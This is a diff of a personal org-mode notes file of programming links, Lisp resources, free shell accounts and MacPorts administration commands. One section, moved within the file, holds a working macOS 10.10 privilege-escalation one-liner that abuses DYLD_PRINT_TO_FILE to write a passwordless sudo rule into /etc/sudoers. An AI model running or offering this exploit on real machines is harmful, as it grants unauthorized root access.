 ------------------------------           ------------------------------
@@ -5022,6 +5244,15 @@ ordered:
       --> full galatea backup
 
 * INFORMATICS
+** Manifesto for Agile Software Development
+Individuals and interactions  over processes and tools
+Working software              over comprehensive documentation
+Customer collaboration        over contract negotiation
+Responding to change          over following a plan
+
+While there is value to the items on the right,
+we value theitems on the left more.
+
 ** newbie programmer
 
     http://javarevisited.blogspot.co.il/2014/05/10-articles-every-programmer-must-read.html
@@ -6932,6 +7163,14 @@ A-< A->	begin/end text
 
 ** EMULATORS: FREE SHELLS
 
+   http://www.livingcomputers.org/Discover/Online-Systems/Request-a-Login.aspx
+
+    trn@irc.free.node.lisp
+
+    Multics with MacLisp
+    ssh dps8@m.trnsz.com
+    enter GuestNameYouPick Guest
+
     Multiple Connections to the Internet:
     http://linux-ip.net/html/adv-multi-internet.html
 
@@ -8572,8 +8811,6 @@ http://www.fema.gov/areyouready/
 
     news:comp.lang.lisp
 
-    freenode.org:  list of ops can be found with:  /msg ChanServ access #lisp list
-    irc://irc.freenode.org/lisp   /msg alis list * -topic *lisp*
 
     http://www.cliki.net/
     http://www.cliki.net/Document
@@ -10181,6 +10418,8 @@ pattern matchers
     http://cyrusharmon.org/cl/static/releases/tiff-uffi-0.1.1-20050701.tar.gz
     http://cyrusharmon.org/cl/static/releases/meta-ffi-0.1.3-20050701.tar.gz
 
+    Stella: https://www.isi.edu/isd/LOOM/Stella/  Lisp-style Symbolic Programming with Delivery in Common-Lisp, C++ and Java
+
     We are pleased to announce the availability of Qi 6.1
     from www.lambdassociates.org. Qi 6.1 runs under CLisp
     and is available as open source under the GNU licence.
@@ -10973,12 +11212,12 @@ the apps I've tried.
     Darwin 7.x == 10.3.x
     Darwin 6.x == 10.2.x
 
-** SYSTEM: Darwin Macport
+*** Macport on Darwin
 
-    sudo port selfupdate
-    sudo port upgrade outdated
-    sudo port uninstall inactive      # remove the inactive ports.
-    sudo port clean --all uninstalled # remove the non-installed distfiles
+     sudo port selfupdate
+     sudo port upgrade outdated
+     sudo port uninstall inactive      # remove the inactive ports.
+     sudo port clean --all uninstalled # remove the non-installed distfiles
 
 ** SYSTEM: Darwin on Linux: darling
 https://www.darlinghq.org/source-code/
@@ -11435,6 +11674,117 @@ gnome-nm-network-editor
     http://www.maconlinux.org/
 
 ** SYSTEMS: MacOSX
+*** MacPorts ports port
+
+sudo caffeinate port selfupdate && sudo caffeinate port upgrade outdated && sudo caffeinate port rev-upgrade
+
+export GRADLE_HOME=/opt/local/share/java/gradle
+sudo port select --set maven maven3
+
+port select --set pip pip27
+port select --set pip pip33
+port select --set pip pip34
+port select --set cython cython27
+port select --set cython cython34
+
+
+If this is a new install you might want to run:
+$ sudo -u _mysql /opt/local/lib/mysql56/bin/mysql_install_db
+
+
+sudo port install port_cutleaves
+sudo port_cutleaves
+sudo port upgrade outdated
+sudo port clean --all installed
+sudo port uninstall mysql5-server
+sudo port uninstall mysql5
+sudo port install mysql56
+sudo port list select mysql56 mysql56 @5.6.21 databases/mysql56
+
+sudo port upgrade cppunit configure.compiler=macports-gcc-4.8
+
+Apple X11.app:    defaults write org.x.X11        enable_test_extensions -boolean true
+MacPorts X11.app: defaults write org.macports.X11 enable_test_extensions -boolean true
+defaults read  org.macports.X11 enable_test_extensions
+defaults read  org.x.X11        enable_test_extensions
+
+**** port: Installing ECL on MacOSX Yosemite
+http://stackoverflow.com/questions/27976312/how-to-cope-with-non-gcc-compatible-code-in-os-x-yosemite-core-headers/28014302#28014302
+
+> port install ecl
+
+fails like this when using a gcc version < 5.
+You can switch to gcc5:
+
+>    port install gcc5
+>    port select gcc mp-gcc5
+>    port install ecl
+
+(but then, it looks like gcc5 can't compile mit-scheme, so you may have to switch back to gcc49 for mit-scheme.
+
+**** port notes 20170828:
+
+  ffmpeg has the following notes:
+    *******
+    ******* This build of ffmpeg includes GPLed code and
+    ******* is therefore licensed under GPL v2 or later.
+    *******
+    ******* The following modules are GPLed:
+    *******
+    *******      postproc
+    *******      libx264
+    *******      libx265
+    *******      libxvid
+    *******
+    ******* To include all nonfree, GPLed and LGPL code use variant +nonfree.
+    ******* To remove nonfree and GPLed code leaving only LGPL code remove the
+    ******* +gpl2 variant.
+    *******
+  gradle has the following notes:
+    Remember to set the environment variable GRADLE_HOME to the path to the gradle distribution: /opt/local/share/java/gradle
+  libomp has the following notes:
+    Use with clang-3.7 and up by adding "-fopenmp" during compilation / linking.
+     * For clang-3.7 without +openmp variant, use:
+       "-I/opt/local/include/libomp -L/opt/local/lib/libomp -fopenmp"
+  postgresql96 has the following notes:
+    To use the postgresql server, install the postgresql96-server port
+  py35-pyflakes has the following notes:
+    To make the Python 3.5 version of py-pyflakes the one that is run when you execute the commands without a version suffix, e.g. 'pyflakes', run:
+
+    port select --set pyflakes py35-pyflakes
+  py35-sympy has the following notes:
+    To make the Python 3.5 version of py-sympy the one that is run when you execute the commands without a version suffix, e.g. 'isympy', run:
+
+    port select --set py-sympy py35-sympy
+  python34 has the following notes:
+    To make this the default Python or Python 3 (i.e., the version run by the 'python' or 'python3' commands), run one or both of:
+
+        sudo port select --set python python34
+        sudo port select --set python3 python34
+
+    ##############################################################
+    # IF YOU ARE USING PYTHON FROM THE TERMINAL, PLEASE INSTALL:
+    #   py34-readline
+    # TO AVOID A LIBEDIT / PYTHON INTERACTION ISSUE.
+    # REF: https://trac.macports.org/ticket/48807
+    ##############################################################
+  python35 has the following notes:
+    To make this the default Python or Python 3 (i.e., the version run by the 'python' or 'python3' commands), run one or both of:
+
+        sudo port select --set python python35
+        sudo port select --set python3 python35
+
+    ##############################################################
+    # IF YOU ARE USING PYTHON FROM THE TERMINAL, PLEASE INSTALL:
+    #   py35-readline
+    # TO AVOID A LIBEDIT / PYTHON INTERACTION ISSUE.
+    # REF: https://trac.macports.org/ticket/48807
+    ##############################################################
+  virtuoso-7 has the following notes:
+    Some antivirus software can cause the virtuoso build to hang indefinitely. If you have any antivirus software installed, please disable it while building virtuoso;
+    it can be re-enabled after virtuoso has been installed.
+
+**** port notes:
 
     sudo port select --set python python27
     sudo port select --set python2 python27
@@ -11542,27 +11892,7 @@ sudo dseditgroup -o edit -a $USER -t user procmod
 
 #-END(src)
 
-
-*** MacOSX 10.10 root exploit:
-
-#+BEGIN(src)
-echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo -s # via reddit: numinit (shorter)
-#+END(src)
-
-*** samba linux -> macosx
-
-The trick is not to give a path to mount, but the name of a "share":
-mount --verbose -t cifs -o pass=${pass},user=pjb,uid=1000,gid=1000,nounix,sec=ntlmssp,noperm,rw '//larissa/Test' /mnt/p
-
-*** larissa
-
- Remember to set the environment variable GRADLE_HOME to the path to
- the gradle distribution: /opt/local/share/java/gradle
-
-Apple X11.app:    defaults write org.x.X11 enable_test_extensions -boolean true
-MacPorts X11.app: defaults write org.macports.X11 enable_test_extensions -boolean true
-
-*** port
+**** port notes:
 
 #+BEGIN(src)
 ##########################################################
@@ -11697,6 +12027,25 @@ sudo cp /opt/local/etc/bitlbee/bitlbee.conf.sample /opt/local/etc/bitlbee/bitlbe
 and edit /opt/local/etc/bitlbee/bitlbee.conf to taste
 
 #+END(src)
+
+*** MacOSX 10.10 root exploit:
+
+#+BEGIN(src)
+echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo -s # via reddit: numinit (shorter)
+#+END(src)
+
+*** samba linux -> macosx
+
+The trick is not to give a path to mount, but the name of a "share":
+mount --verbose -t cifs -o pass=${pass},user=pjb,uid=1000,gid=1000,nounix,sec=ntlmssp,noperm,rw '//larissa/Test' /mnt/p
+
+*** larissa
+
+ Remember to set the environment variable GRADLE_HOME to the path to
+ the gradle distribution: /opt/local/share/java/gradle
+
+Apple X11.app:    defaults write org.x.X11 enable_test_extensions -boolean true
+MacPorts X11.app: defaults write org.macports.X11 enable_test_extensions -boolean true
 
 *** Postgres
 #+BEGIN(src)
